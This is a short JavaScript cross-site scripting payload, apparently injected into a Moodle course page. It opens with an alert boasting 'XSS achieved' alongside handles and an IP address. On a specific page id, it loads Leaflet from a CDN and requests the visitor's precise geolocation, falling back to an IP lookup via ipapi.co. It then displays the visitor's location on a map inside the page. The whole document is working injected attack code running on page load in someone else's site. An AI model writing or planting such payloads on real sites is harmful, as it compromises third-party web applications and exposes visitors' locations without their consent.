alert('XSS achieved!!! :3 ~ wntiv_, 162.159.137.232, amsaynz');
// document.querySelector('.userprofile .description div').remove();

(function(){
  if(new URLSearchParams(window.location.search).get('id') !== '219026') return;

  const el = document.querySelector('.filter_generico_tabitem[title*="moodle-xss"]');
  if (!el) return;

  if (!el.style.height) el.style.height = '400px';

  const link = document.createElement('link');
  link.rel = 'stylesheet';
  link.href = 'https://cdn.jsdelivr.net/npm/leaflet@1.9.4/dist/leaflet.css';
  document.head.appendChild(link);

  const script = document.createElement('script');
  script.src = 'https://cdn.jsdelivr.net/npm/leaflet@1.9.4/dist/leaflet.js';
  script.onload = () => {
    const showMap = (lat, lon, label) => {
      const map = L.map(el).setView([lat, lon], 13);
      L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
        maxZoom: 19,
        attribution: '&copy; OpenStreetMap contributors'
      }).addTo(map);
      L.marker([lat, lon]).addTo(map).bindPopup(label).openPopup();
    };

    const useIP = () => {
      fetch("https://ipapi.co/json/")
        .then(res => res.json())
        .then(d => showMap(d.latitude, d.longitude, `Approximate location (IP): ${d.city}, ${d.country_name}`));
    };

    if(navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        pos => showMap(pos.coords.latitude, pos.coords.longitude, "Precise location (GPS/WiFi)"),
        useIP
      );
    } else {
      useIP();
    }
  };
  document.head.appendChild(script);
})();